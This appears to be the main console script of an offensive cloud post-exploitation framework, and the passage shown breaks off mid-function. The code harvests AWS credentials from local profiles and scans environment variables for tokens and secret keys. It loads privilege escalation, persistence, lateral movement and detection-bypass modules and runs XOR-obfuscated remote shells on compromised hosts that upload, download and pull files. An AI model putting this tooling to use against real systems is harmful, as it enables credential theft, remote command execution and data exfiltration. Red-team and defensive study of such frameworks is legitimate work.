#!/usr/bin/python3
import base64
import socket, errno
import boto3
import botocore.session
import sys
import core.banner.banner
import os
import copy
import argparse
from termcolor import colored
from core.help import help
import textwrap
import json
import botocore
from queue import Queue
import random
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.shortcuts import CompleteStyle
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit import prompt
from prompt_toolkit.completion import NestedCompleter
from colorama import init
import re
import time
from datetime import datetime
import string
from pydoc import pipepager
import platform

from core.enum_user_privs.enum_user_privs import enum_privs
from core.enum_user_privs.getuid import getuid

import core.run_module.run_aws_module
import core.run_module.run_azure_module
import core.run_module.run_gcp_module

path = os.getcwd() + '\\less_binary'

#def str_xor(s1, s2):
#    return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])

def str_xor(a, key):
    cipherAscii = ""
    keyLength = len(key)
    for i in range(0, len(a)):
        j = i % keyLength
        if not a[i] is str:
            xor = ord(str(a[i])) ^ ord(key[j])
        else:
            xor = ord(a[i]) ^ ord(key[j])
        cipherAscii = cipherAscii + chr(xor)
    return cipherAscii

def sendall(s, data):
    splitLen = 1500
    for lines in range(0, len(data), splitLen):
        outputData = data[lines:lines + splitLen]
        s.send(outputData)

def recvall(s):
    data = b''
    #bufferlength = 65500
    bufferlength = 1048576
    while True:
        a = s.recv(bufferlength)
        #if len(a) == 0:
        if a.decode().strip()[-4:] == 'done':
            data += a
            return data[:-4]
        else:
            data += a


if platform.system() == 'Windows':
    pwsh = "powershell.exe -c '$env:Path = " + path + " + ;$env:Path'"
    os.popen(pwsh)

init()

regions = [
    'af-south-1',
    'ap-east-1',
    'ap-northeast-1',
    'ap-northeast-2',
    'ap-northeast-3',
    'ap-south-1',
    'ap-southeast-1',
    'ap-southeast-2',
    'ca-central-1',
    'eu-central-1',
    'eu-north-1',
    'eu-south-1',
    'eu-west-1',
    'eu-west-2',
    'eu-west-3',
    'me-south-1',
    'sa-east-1',
    'us-east-1',
    'us-east-2',
    'us-gov-east-1',
    'us-gov-west-1',
    'us-west-1',
    'us-west-2'
]

'''
particles = [
    {
        "Name": "dnsdwwad",
        "IP":"1.1.1.1",
        "Hostname":"host",
        "LAN IP":"192.168.1.1",
        "Port":"65000",
        "OS": "Linux",
        "User": "host/glb",
        "Module":"aws_tcp"
    }
]
'''

system = platform.system()

all_sessions = []

session = {}
sess_test = {}
sockets = {}

enc_key = ""

botocoresessions = []

show = [
    'cleanup',
    'detection',
    'detectionbypass',
    'enum',
    'exploit',
    'lateralmovement',
    'listeners',
    'persistence',
    'privesc',
    'reconnaissance',
    'stager',
    'misc'
]

colors = [
    "not-used",
    "red",
    "blue",
    "yellow",
    "green",
    "magenta",
    "cyan",
    "white",
    "red",
    "blue",
    "yellow",
    "green",
    "magenta",
    "cyan",
    "white"
]

output = ""

def list_dictionary(d, n_tab):
    global output
    if isinstance(d, list):
        n_tab += 1
        for i in d:
            if not isinstance(i, list) and not isinstance(i, dict):
                output += ("{}{}\n".format("\t" * n_tab, colored(i, colors[n_tab])))
            else:
                list_dictionary(i, n_tab)
    elif isinstance(d, dict):
        n_tab+=1
        for key, value in d.items():
            if not isinstance(value, dict) and not isinstance(value, list):
                output += ("{}{}: {}\n".format("\t"*n_tab, colored(key, colors[n_tab], attrs=['bold']) , colored(value, colors[n_tab+1])))
            else:
                output += ("{}{}:\n".format("\t"*n_tab, colored(key, colors[n_tab], attrs=['bold'])))
                list_dictionary(value, n_tab)

def check_env_var(environ):
    for key, value in environ.items():
        if "kube" in key or "KUBE" in key or "Kube" in key:
            print("{} {}:{}".format(
                colored("[*] Found environment variable which might point to Kubernetes", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "git" in key or "GIT" in key or "Git" in key:
            print("{} {}:{}".format(
                colored("[*] Found environment variable which might point to GitHub or GitLab", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "token" in key or "TOKEN" in key or "Token" in key:
            print("{} {}:{}".format(
                colored("[*] Found a Token (hopefully) on environment variables", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "jenkins" in key or "JENKINS" in key or "Jenkins" in key:
            print("{} {}:{}".format(
                colored("[*] Found environment variable which might point to Jenkins", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "aws" in key or "AWS" in key or "Aws" in key:
            print("{} {}:{}".format(
                colored("[*] Found environment variable which might point to AWS", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "aws_access" in key or "AWS_ACCESS" in key or "Aws_Access" in key:
            print("{} {}:{}".format(
                colored("[*] Found AWS Access Key on environment variables", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "aws_secret" in key or "AWS_SECRET" in key or "Aws_Secret" in key:
            print("{} {}:{}".format(
                colored("[*] Found AWS Secret Key on environment variables", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "aws_session" in key or "AWS_SESSION" in key or "Aws_Session" in key:
            print("{} {}:{}".format(
                colored("[*] Found AWS Session Key on environment variables", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )



workspaces = []
workspace = ""
particle = ""
global shell

terminal = colored("AWS", 'yellow')
particles = {}

module_char = ""

def set_azure_credentials(command, comms):
    profile_name = ""
    if len(command.split(" ")) == 2:
        profile_name = input("Profile Name: ")
    elif len(command.split(" ")) > 2:
        print("Profile Name: {}".format(command.split(" ")[2]))
    profile_name = command.split(" ")[2]

    type = input(colored(
        """
        Select the authentication method:
        """
    ))
    client_id = input("Client ID: ")
    secret_key = input("Secret Key ID: ")

    sess_test['provider'] = 'AZURE'
    sess_test['profile'] = str(profile_name)
    sess_test['client_id'] = str(client_id)
    sess_test['secret_key'] = str(secret_key)
    sess_test['region'] = ""
    yon = input("\nDo you also have a session token?[y/N] ")
    if yon == 'y' or yon == 'Y':
        sess_token = input("Session Token: ")
    sess_test['session_token'] = sess_token

    comms['use']['credentials'][profile_name] = None

    if sess_test['profile'] == "" and sess_test['access_key_id'] == "" and sess_test['secret_key'] == "" and sess_test[
        'region'] == "":
        pass

    else:
        cred_prof = sess_test['profile']
    all_sessions.append(copy.deepcopy(sess_test))

    print(colored("[*] Credentials set. Use ", "green") + colored("'show credentials' ", "blue") + colored("to check them.",
                                                                                                           "green"))
    print(colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored(
        "Use ", "green") + colored("'show current-creds' ", "blue") + colored("to check them.", "green"))

def main(workspace, particle, terminal, p, s):
    print(
        colored("[*] Importing sessions found on ~/.aws","yellow")
    )
    botocoresessions = botocore.session.Session().available_profiles

    if len(botocoresessions) == 0:
        print(
            colored(
                "[*] No sessions found on ~/.aws",
                "green")
        )
    else:
        print(
            colored("[*] Imported sessions found on ~/.aws. Enter 'show credentials' to get the credentials.", "green")
        )
        if len(all_sessions) == 0:
            for botoprofile in botocoresessions:
                botosession = botocore.session.Session(profile=botoprofile)
                ass = {}
                ass['provider'] = 'AWS'
                ass['profile'] = botoprofile
                ass['access_key_id'] = botosession.get_credentials().access_key
                ass['secret_key'] = botosession.get_credentials().secret_key
                ass['region'] = botosession.get_config_variable('region')

                if not botosession.get_credentials().token == None:
                    ass['session_token'] = botosession.get_credentials().token

                all_sessions.append(ass)

        else:
            for botoprofile in botocoresessions:
                for pr in all_sessions:
                    if pr['profile'] == botoprofile:
                        yn = input("Profile '{}' exists. Do you want to overwrite? [y/N] ".format(pr['profile']))
                        if yn == 'y' or yn == 'Y':
                            botosession = botocore.session.Session(profile=botoprofile)
                            ass = {}
                            ass['provider'] = 'AWS'
                            ass['profile'] = botoprofile
                            ass['access_key_id'] = botosession.get_credentials().access_key
                            ass['secret_key'] = botosession.get_credentials().secret_key
                            ass['region'] = botosession.get_config_variable('region')
                            if not botosession.get_credentials().token == None:
                                ass['session_token'] = botosession.get_credentials().token

                            all_sessions.append(ass)
                    else:
                        botosession = botocore.session.Session(profile=botoprofile)
                        ass = {}
                        ass['provider'] = 'AWS'
                        ass['profile'] = botoprofile
                        ass['access_key_id'] = botosession.get_credentials().access_key
                        ass['secret_key'] = botosession.get_credentials().secret_key
                        ass['region'] = botosession.get_config_variable('region')
                        if not botosession.get_credentials().token == None:
                            ass['session_token'] = botosession.get_credentials().token

                        all_sessions.append(ass)

    global module_char

    if not module_char == "":
        #terminal = module_char
        m = (module_char.split("/")[1])[:-4]

        imported_module = __import__(m)

    cred_prof = ""

    sess_token = ""

    useragent = ""
    user_agents_windows = [
        'Boto3/1.7.48 Python/3.9.1 Windows/10 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.8.1 Windows/10 Botocore/1.10.48',
        'Boto3/1.7.48 Python/2.7.0 Windows/10 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.9.1 Windows/8 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.8.1 Windows/8 Botocore/1.10.48',
        'Boto3/1.7.48 Python/2.7.0 Windows/8 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.9.1 Windows/7 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.8.1 Windows/7 Botocore/1.10.48',
        'Boto3/1.7.48 Python/2.7.0 Windows/7 Botocore/1.10.48'
    ]
    user_agents_linux = [
        'Boto3/1.9.89 Python/2.7.12 Linux/4.1.2-34-generic',
        'Boto3/1.9.89 Python/3.8.1 Linux/4.1.2-34-generic',
        'Boto3/1.9.89 Python/3.9.1 Linux/5.9.0-34-generic'
    ]

    allmodules = []
    for module in show:
        arr = os.listdir("./module/" + module)
        for x in arr:
            if "__" in x:
                continue
            elif ".git" in x:
                continue
            else:
                mod = "{}/{}".format(module,x.split(".py")[0])
                allmodules.append(mod)

    comms = {
        "show":{
            "credentials": None,
            "sockets":None,
            "particles": None,
            "workspaces": None,
            "modules": None,
            "user-agent":None,
            "current-creds": None,
        },
        "search":None,
        "exit":None,
        "use":{
            "credentials":{},
            "particle":{},
            "workspace": {},
            "module": WordCompleter(
                words=(allmodules),
                pattern=re.compile(r'([a-zA-Z0-9_\\/]+|[^a-zA-Z0-9_\s]+)')
                                ),
        },
        "create": {
            "workspace": None
        },
        "getuid":None,
        "insert":{
            "credentials":None
        },
        "set": {
            "aws-credentials": None,
            "azure-credentials": None,
            "gcp-credentials": None,
            "user-agent": {
                "linux":None,
                "windows":None,
                "custom":None
            },
            "region": {
                "af-south-1": None,
                "ap-east-1": None,
                "ap-northeast-1": None,
                "ap-northeast-2": None,
                "ap-northeast-3": None,
                "ap-south-1": None,
                "ap-southeast-1": None,
                "ap-southeast-2": None,
                "ca-central-1": None,
                "eu-central-1": None,
                "eu-north-1": None,
                "eu-south-1": None,
                "eu-west-1": None,
                "eu-west-2": None,
                "eu-west-3": None,
                "me-south-1": None,
                "sa-east-1": None,
                "us-east-1": None,
                "us-east-2": None,
                "us-gov-east-1": None,
                "us-gov-west-1": None,
                "us-west-1": None,
                "us-west-2": None
            }
        },
        "help": {
            "workspace":None,
            "user-agent":None,
            "module":None,
            "credentials": None,
            "shell":None
        },
        "options": None,
        "back": None,
        "remove":{
            "workspace": {},
            "credentials": {},
        },
        "run": None,
        "unset": {
            "credentials":None,
            "user-agent":None,
            "particle":None
        },
        "dump": {
            "credentials": None,
        },
        "import": {
            "credentials": {},
        },
        "kill":{
            "socket":{},
            "particle":{
                "all":None
            }
        },
        "shell":{
            "check_env": None,
            "exit": None,
            "upload": None,
            "download": None,
            "run_in_memory":None
        },
        "enum_user_privs":None,
        "rename":{
            "particle":{},
            "workspace":{}
        }
    }

    if s:
        for key,value in s.items():
            comms['kill']['socket'][key] = None
        sockets.update(s)
        s.clear()

    for c in show:
        comms['show'][c] = None

    for c in all_sessions:
        comms['use']['credentials'][c['profile']] = None

    for c in all_sessions:
        comms['remove']['credentials'][c['profile']] = None

    if not os.path.isdir('./credentials/'):
        os.mkdir('./credentials/')

    arr = os.listdir("./credentials/")
    for x in arr:
        if "__" in x:
            continue
        elif ".git" in x:
            continue
        else:
            comms['import']['credentials'][x] = None

    if not os.path.isdir('./workspaces/'):
        os.mkdir('./workspaces/')

    arr = os.listdir("./workspaces/")
    for x in arr:
        if "__" in x:
            continue
        elif ".git" in x:
            continue
        else:
            workspaces.append(x)
    for x in workspaces:
        comms['remove']['workspace'][x] = None
        comms['use']['workspace'][x] = None


    completer = NestedCompleter.from_nested_dict(comms)

    com = "({})({})({}) >>> ".format(colored(workspace,"green"),colored(particle,"red"), terminal)

    try:
        history_file = FileHistory(".nebula-history-file")
        session = PromptSession(history=history_file)
        command = session.prompt(
            ANSI(
                com
            ),
            completer=completer,
            complete_style=CompleteStyle.READLINE_LIKE
        )
        command.strip()

        while (True):
            if p:
                particles.update(p)
                p.clear()

            for key, value in particles.items():
                comms['use']['particle'][key] = None
                comms['kill']['particle'][key] = None
                comms['rename']['particle'][x] = None

            if os.path.exists('./module/listeners/__listeners/.particles'):
                partdir = os.listdir('./module/listeners/__listeners/.particles')
                for y in partdir:
                    if not os.path.isdir(y):
                        with open("./module/listeners/__listeners/.particles/{}".format(y), 'r') as part_file:
                            particles.update(json.load(part_file))
                        part_file.close()

            if command == None or command == "":
                com = "({})({})({}) >>> ".format(colored(workspace,"green"),colored(particle,"red"), terminal)

                for x in workspaces:
                    comms['remove']['workspace'][x] = None
                completer = NestedCompleter.from_nested_dict(comms)
                history_file = FileHistory(".nebula-history-file")
                session = PromptSession(history=history_file)
                command = session.prompt(
                    ANSI(
                        com
                    ),
                    completer=completer,
                    complete_style=CompleteStyle.READLINE_LIKE
                )
                command.strip()

            elif command == 'exit':
                command = session.prompt(
                    ANSI(
                        colored("Are you sure? [y/N] ","red")
                    )
                )
                command.strip()
                if command == "Y" or command == "y":
                    if sockets:
                        for key, value in sockets.items():
                            s = value['socket']
                            s.shutdown(2)

                            s.close()

                        print("All socket closed!")
                    exit()
                    sys.exit()
                    exit()

            elif command == 'rename':
                print(colored("""[*] Usage: 
                                    If you are not using any particle, then:
                                        rename particle <current particle name> <new particle name>
                                    
                                    Else, if you are using a particle:
                                        rename particle <current particle name> <new particle name>
                                        
                              ""","red"))

            elif command.split(" ")[0] == 'rename':
                if len(command.split(" ")) < 3:
                    print(colored("""[*] Usage: 
                                        If you are not using any particle, then:
                                            rename particle <current particle name> <new particle name>

                                        Else, if you are using a particle:
                                            rename particle <current particle name> <new particle name>

                                  """, "red"))
                elif len(command.split(" ")) == 3:
                    if particle == "":
                        print(colored("""[*] Usage: 
                                            If you are not using any particle, then:
                                                rename particle <current particle name> <new particle name>

                                            Else, if you are using a particle:
                                                rename particle <current particle name> <new particle name>
                                      
                                      """, "red"))
                    else:
                        testcount = 0
                        for key,value in particles.items():
                            if key == particle:
                                key = particle
                                testcount += 1

                        if testcount == 0:
                            print(colored("[*] Particle does not exist.", "red"))

                elif len(command.split(" ")) == 4:
                    testcount = 0
                    for key, value in particles.items():
                        if key == command.split(" ")[2]:
                            key = command.split(" ")[3]
                            testcount += 1

                    if testcount == 0:
                        print(colored("[*] Particle does not exist.", "red"))

            elif command == 'enum_user_privs':
                ready = False
                if cred_prof == "":
                    print(colored("[*] Please choose a set of credentials first using 'use credentials <name>'.", "red"))
                else:
                    ready = True

                if workspace == "":
                    print(
                        colored("[*] Please choose a workspace first using 'use workspace <name>'.", "red"))
                    ready = False

                if ready:
                    for sess in all_sessions:
                        if sess['profile'] == cred_prof:
                            if sess['region'] == "":
                                print(colored("[*] Set the region also: set region <region>", "red"))
                            else:
                                enum_privs(sess, workspace)

            elif command == 'enum_privesc':
                ready = False
                if cred_prof == "":
                    print(colored("[*] Please choose a set of credentials first using 'use credentials <name>'.", "red"))
                else:
                    ready = True

                if workspace == "":
                    print(
                        colored("[*] Please choose a workspace first using 'use workspace <name>'.", "red"))
                    ready = False

                if ready:
                    for sess in all_sessions:
                        if sess['profile'] == cred_prof:
                            enum_privs(sess, workspace)

            elif command == 'help':
                if particle == "":
                    help.help()
                else:
                    help.help()

            elif len(command.split(" ")) > 2 and command.split(" ")[0] == 'kill':
                if command.split(" ")[1] == 'socket':
                    for key,value in sockets.items():
                        if command.split(" ")[2] == key:
                            os.remove(command.split(" ")[2])

                            if value['type'] == 'SOCK_STREAM':
                                try:
                                    q = value['queue']
                                    #q.task_done()
                                    #q.task_done()
                                    closed = []
                                    if particles:
                                        for c,v in particles.items():
                                            if value['module'] == v['module']:
                                                conn = v['socket']
                                                exit_command = str_xor('exit ', enc_key)
                                                exit_command += 'done'
                                                conn.send(exit_command.encode())
                                                conn.recv(1024)
                                                closed.append(c)

                                        for close in closed:
                                            del particles[close]

                                    s = value['socket']
                                    s.shutdown(2)
                                    s.close()
                                    value['socket'] = None
                                    print(colored("[*] Socket '{}' killed!".format(key),"green"))
                                except:
                                    e = sys.exc_info()[1]
                                    if "Invalid argument" in e:
                                        continue
                                    else:
                                        print(colored("[*] {}".format(e), "red"))

                            elif value['type'] == 'SOCK_DGRAM':
                                try:
                                    q = value['queue']
                                    # q.task_done()
                                    # q.task_done()
                                    closed = []
                                    if particles:
                                        for c, v in particles.items():
                                            if value['module'] == v['module']:
                                                conn = v['socket']
                                                conn.sendto('exit'.encode(), (v['IP'], v['Port']))
                                                conn.recvfrom(1024)
                                                closed.append(c)

                                        for close in closed:
                                            del particles[close]

                                    s = value['socket']
                                    s.shutdown(2)
                                    s.close()
                                    value['socket'] = None
                                    print(colored("[*] Socket '{}' killed!".format(key), "green"))
                                except:
                                    e = sys.exc_info()
                                    if "Invalid argument" in e:
                                        continue
                                    else:
                                        print(colored("[*] {}".format(e), "red"))

            elif len(command.split(" ")) > 1 and command.split(" ")[0] == 'help':
                help_comm = command.split(" ")[1]
                help.specific_help(help_comm)

            elif command == "create":
                print("{} {}".format(colored("[*] The exact command is:", "red"), colored("create wordspace <workspace name>", "yellow")))

            elif command.split(" ")[0] == "create":
                if command.split(" ")[1] == "workspace":
                    if len(command.split(" ")) < 3:
                        print("{} {}".format(colored("[*] The exact command is:", "red"),colored("create wordspace <workspace name>", "yellow")))

                    else:
                        if not os.path.exists("./workspaces"):
                            os.makedirs("./workspaces")

                        if not os.path.exists("./workspaces/{}".format(command.split(" ")[2])):
                            os.makedirs("./workspaces/{}".format(command.split(" ")[2]))
                            workspaces.append(command.split(" ")[2])
                            workspace = command.split(" ")[2]
                            for x in workspaces:
                                comms['remove']['workspace'][x] = None
                            completer = NestedCompleter.from_nested_dict(comms)
                            print(colored("[*] Workspace '"+(command.split(" ")[2])+"' created.","green"))
                            print(colored("[*] Current workspace set at '"+(command.split(" ")[2])+"'.", "green"))
                        else:
                            print(colored("[*] The workspace already exists. Either use it, remove it, or create a different one.", "red"))

            elif command == "search":
                print(colored("[*] Enter a pattern to search! Eg: search s3", "red"))

            elif command.split(" ")[0] == 'search':
                arr = os.listdir("./module/")
                search_dir = []
                for x in arr:
                    if "__" in x:
                        continue
                    elif ".git" in x:
                        continue
                    elif os.path.isdir("./module/{}".format(x)):
                        dir = os.listdir("./module/{}/".format(x))
                        for y in dir:
                            if not os.path.isdir(y):
                                if "__" in y:
                                    continue
                                elif ".git" in y:
                                    continue
                                else:
                                    search_dir.append(x+"/"+(y.split(".py")[0]).split(".")[0])
                    else:
                        continue
                List = []
                list2 = []
                for x in search_dir:
                    if command.split(" ")[1] in x:
                        thedir = x.split("/")[0]
                        sys.path.insert(0, "./module/" + thedir)
                        imported_module = __import__(x.split("/")[1])
                        list2.append("\t{}".format(colored(x, "blue")))
                        list2.append("\t{}".format(colored(imported_module.description, "yellow")))
                        List.append(list2)
                        list2 = []

                indention = 80
                max_line_length = 60

                for i in range(len(List)):
                    out = List[i][0].ljust(indention, ' ')
                    cur_indent = 0
                    for line in List[i][1].split('\n'):
                        for short_line in textwrap.wrap(line, max_line_length):
                            out += ' ' * cur_indent + short_line.lstrip() + "\n"
                            cur_indent = indention
                        print(out)

            elif command == 'back':
                module_char = ""
                terminal = colored("AWS",'yellow')

            elif command == 'background':
                if not particle == "":
                    particle = ""
                else:
                    print(colored("[*] You have no particles active", "red"))

            elif command == "use":
                print(colored("[*] Enter a module to use! ", "red"))

            elif command.split(" ")[0] == 'use':
                if command.split(" ")[1] == 'credentials':
                    if len(command.split(" ")) == 3:
                        cred_C = 0
                        for sess in all_sessions:
                            if sess['profile'] == command.split(" ")[2]:
                                cred_prof = command.split(" ")[2]
                                cred_C = 1
                                print(colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored("Use ","green") + colored("'show current-creds' ","blue") + colored("to check them.","green"))
                        if cred_C == 0:
                            print(colored("[*] This credential does not exist", "red"))

                elif command.split(" ")[1] == 'particle':
                    if not len(command.split(" ")) == 3:
                        print(colored("[*] Usage: use particle <name of particle>", "red"))
                    else:
                        par_test = 1
                        for name, par in particles.items():
                            if name == command.split(" ")[2]:
                                particle = name
                                shell = par['socket']
                                enc_key = par['ENCKEY']
                                par_test = 0
                        if par_test == 1:
                            print(colored("[*] No session named: {}".format(command.split(" ")[1]), "red"))

                elif command.split(" ")[1] == "workspace":
                    for x in workspaces:
                        comms['remove']['workspace'][x] = None
                    completer = NestedCompleter.from_nested_dict(comms)
                    if len(command.split(" ")) < 3:
                        print("{} {}".format(colored("[*] The exact command is:", "red"),colored("use wordspace <workspace name>", "yellow")))

                    else:
                        if len(workspaces) == 0:
                            print(colored("[*] There are no workspaces configured", "red"))
                        else:
                            right = 0
                            for w in workspaces:
                                if w == command.split(" ")[2]:
                                    workspace = w
                                    right = 1

                            if right == 0:
                                print(colored("[*] The workstation name is wrong.", "red"))

                elif command.split(" ")[1] == 'module':
                    if not "/" in command.split(" ")[2]:
                        print(colored("[*] Exact module format is <type>/<name>. Eg: use module enum/s3_list_buckets","red"))

                    else:
                        try:
                            thedir = (command.split(" ")[2]).split("/")[0]
                            #thedir = "./" + (command.split(" ")[2]).split("/")[0]
                            sys.path.insert(0, "./module/" + thedir)
                            terminal = colored(command.split(" ")[2], "blue")
                            module_char = (command.split(" ")[2]).split("/")[1]
                            imported_module = __import__(module_char)
                            module_char = terminal
                            #comms['set'] = {
                            #    "credentials":None
                            #}
                            #comms['unset'] = {}
                            for c,v in imported_module.variables.items():
                                if c == 'SERVICE':
                                    pass
                                else:
                                    comms['set'][c] = None
                                    comms['unset'][c] = None
                            completer = NestedCompleter.from_nested_dict(comms)

                        except(ModuleNotFoundError):
                            print(colored("[*] Module does not exist","red"))
                            terminal = colored("AWS",'yellow')
                            module_char = ""

            elif command.split(" ")[0] == 'remove':
                if command.split(" ")[1] == 'credentials':
                    if len(command.split(" ")) == 2:
                        command = input(colored("You are about to remove all credentials. Are you sure? [y/N] ","red"))
                        if command == "Y" or command == "y":
                            all_sessions.clear()
                            print(colored("[*] All credentials removed.", "yellow"))

                    elif len(command.split(" ")) == 3:
                        if command.split(" ")[2] == "" or command.split(" ")[2] == None:
                            for sess in all_sessions:
                                if sess['profile'] == "":
                                    command = input(colored("You are about to remove credential '{}'. Are you sure? [y/N] ".format(sess['profile']),"red"))
                                    if command == "Y" or command == "y":
                                        all_sessions.remove(sess)
                                        print(colored("[*] Credential '{}' removed.".format(sess['profile']), "yellow"))

                        else:
                            for sess in all_sessions:
                                if sess['profile'] == command.split(" ")[2]:
                                    removeyn = input(colored("You are about to remove credential '{}'. Are you sure? [y/N] ".format(sess['profile']),"red"))
                                    if removeyn == "Y" or removeyn == "y":
                                        all_sessions.remove(sess)

                    else:
                        print(colored("[*] Set the credential profile to remove.", "red"))

                elif command.split(" ")[1] == "workspace":
                    if len(command.split(" ")) < 3:
                        print("{} {}".format(colored("[*] The exact command is:", "red"), colored("remove wordspace <workspace name>", "yellow")))

                    else:
                        if os.path.exists("./workspaces/{}".format(command.split(" ")[2])):
                            yo = input(colored("[*] Are you sure you want to delete the workspace? [y/N] ","red"))
                            if yo == 'y' or yo == 'Y':
                                os.rmdir("./workspaces/{}".format(command.split(" ")[2]))
                                workspaces.remove(command.split(" ")[2])
                        else:
                            print(colored("[*] The workstation name is wrong.", "red"))

            elif command.split(" ")[0] == 'run':
                if module_char == "":
                    print(colored("[*] Choose a module first.","red"))

                else:
                    if workspace == "":
                        history_file = FileHistory(".nebula-history-file")
                        session = PromptSession(history=history_file)
                        letters = string.ascii_lowercase
                        w = ''.join(random.choice(letters) for i in range(8))
                        command = session.prompt(
                            ANSI(
                                colored("A workspace is not configured. Workspace '" + w + "' will be created. Are you sure? [y/N] ", "red")
                            )
                        )
                        command.strip()
                        if command == "Y" or command == "y":
                            if not os.path.exists("./workspaces"):
                                os.makedirs("./workspaces")

                            if not os.path.exists("./workspaces/{}".format(command.split(" ")[2])):
                                os.makedirs("./workspaces/{}".format(command.split(" ")[2]))
                                workspaces.append(command.split(" ")[2])
                            else:
                                print(colored(
                                    "[*] The workspace already exists. Either use it, remove it, or create a different one.",
                                    "red"))

                    if not workspace == "":
                        count = 0
                        for key, value in imported_module.variables.items():
                            if value['required'] == 'true' and value['value'] == "":
                                print(colored("[*] Option '{}' is not set!".format(key), "red"))
                                count += 1

                        if count == 0:
                            m_name = (module_char.split("/")[1]).split("_")[0]
                            if m_name == 'aws':
                                try:
                                    core.run_module.run_aws_module.run_aws_module(imported_module, all_sessions, cred_prof, workspace, useragent)

                                except:
                                    e = sys.exc_info()
                                    print(colored("[*] {}".format(e), "red"))
                                    print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))

                            elif m_name == 'azure':
                                try:
                                    #core.run_module.run_azure_module.run_azure_module(imported_module, all_sessions, cred_prof, workspace, useragent)
                                    core.run_module.run_azure_module.run_azure_module(imported_module, all_sessions, cred_prof, workspace, useragent)

                                except:
                                    e = sys.exc_info()
                                    print(colored("[*] {}".format(e), "red"))
                                    print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))

                            elif m_name == 'azuread':
                                try:
                                    core.run_module.run_azure_module.run_azure_module(imported_module, all_sessions, cred_prof, workspace, useragent)

                                except:
                                    e = sys.exc_info()
                                    print(colored("[*] {}".format(e), "red"))
                                    print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))

                            elif m_name == 'gcp':
                                try:
                                    core.run_module.run_gcp_module.run_gcp_module(imported_module, all_sessions, cred_prof, workspace, useragent)

                                except:
                                    e = sys.exc_info()
                                    print(colored("[*] {}".format(e), "red"))
                                    print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))
                            else:
                                imported_module.exploit(workspace)
                    else:
                        print(colored(
                            "[*] Create a workstation first using 'create workspace <workstation name>'.",
                            "red"))

            elif command == 'shell':
                print(colored(
                    "[*] Enter a command to run on the remote system. Eg: 'shell <command>'", "red"))

            elif command.split(" ")[0] == "shell":
                if not particle:
                        print(colored("[*] You need to have or choose a session first. To choose a session, enter 'use particle <session name>'.", "red"))

                else:
                    try:
                        if command.split(" ")[1] == 'exit' or command.split(" ")[1] == 'quit':
                            conn = particles[particle]['socket']
                            conn.close()

                            print("{}{}{}".format(
                                colored("[*] Particle '","green"),
                                colored(particle,"blue"),
                                colored("' closed","green")
                            ))

                            del comms['use']['particle'][particle]
                            particles[particle]['socket'] = None
                            del particles[particle]
                            #del p[particle]
                            particle = ""

                        elif command.split(" ")[1] == "meta-data":
                            if len(command.split(" ")) == 2:
                                print()
                            elif len(command.split(" ")) == 3:
                                print()

                            else:
                                print(colored("Usage: shell meta-data <option>",
                                              "red"))

                        elif command.split(" ")[1] == "upload":
                            if len(command.split(" ")) < 3:
                                print(
                                    colored("[*] Usage: shell upload <filepath>", "red")
                                )
                            else:
                                filepath = command.split(" ")[2]
                                thefile = open(filepath, 'rb')
                                filedata = thefile.read()
                                filedatab64 = base64.b32encode(filedata).decode()
                                upload_json = {
                                    "filepath":filepath.split("/")[-1],
                                    "filedata":filedatab64
                                }
                                send_data = "upload {}".format(json.dumps(upload_json))

                                send_xor_data = str_xor(send_data, enc_key)
                                send_xor_data += 'done'
                                shell.send(send_xor_data.encode())
                                print(
                                    colored("[*] File '{}' uploaded .".format(filepath.split("/")[-1]), "green")
                                )

                        elif command.split(" ")[1] == "download":
                            if len(command.split(" ")) < 3:
                                print(
                                    colored("[*] Usage: shell download <filepath>", "red")
                                )
                            else:
                                filepath = command.split(" ")[2]
                                download_json = {
                                    "filepath":filepath
                                }
                                print("download {}done".format(json.dumps(download_json)))
                                download_xor = str_xor("download {}done".format(json.dumps(download_json)), enc_key)
                                shell.send(download_xor.encode())
                                b64_data = recvall(shell).decode()
                                b64_xor = str_xor(b64_data, enc_key)
                                binary_data = base64.b32decode(b64_xor.encode())
                                bin_file = open(filepath.split("/")[-1], 'wb')
                                bin_file.write(binary_data)
                                bin_file.close()
                                print(
                                    colored("[*] File '{}' downloaded .".format(filepath.split("/")[-1]), "green")
                                )

                        elif command.split(" ")[1] == 'check_env':

                            print(
                                colored("[*] It might take 5-6 seconds to work. Please wait! (or don't. Fuck you in each case.)", "yellow")
                            )
                            check_env_command = str_xor("check_env ", enc_key)
                            check_env_command += 'done'
                            shell.send(check_env_command.encode())

                            #fragments = []
                            #while True:
                            #    chunk = shell.recv(65534)
                            #    if not chunk:
                            #        break
                            #    fragments.append(chunk)
                            #check_env_response_bytes = b''.join(fragments)

                            check_env_response = str_xor(recvall(shell).decode(), enc_key)

                            #while check_env_response[-5:] == 'still':
                            #    check_env_command = str_xor(" ", enc_key)
                            #    shell.send(check_env_command.encode())
                            #    check_env_response += str_xor(shell.recv(65534).decode(), enc_key)
                            #print(check_env_response)

                            check_env_dict = json.loads(check_env_response)

                            now = datetime.now()
                            dt_string = now.strftime("%d_%m_%Y_%H_%M_%S")
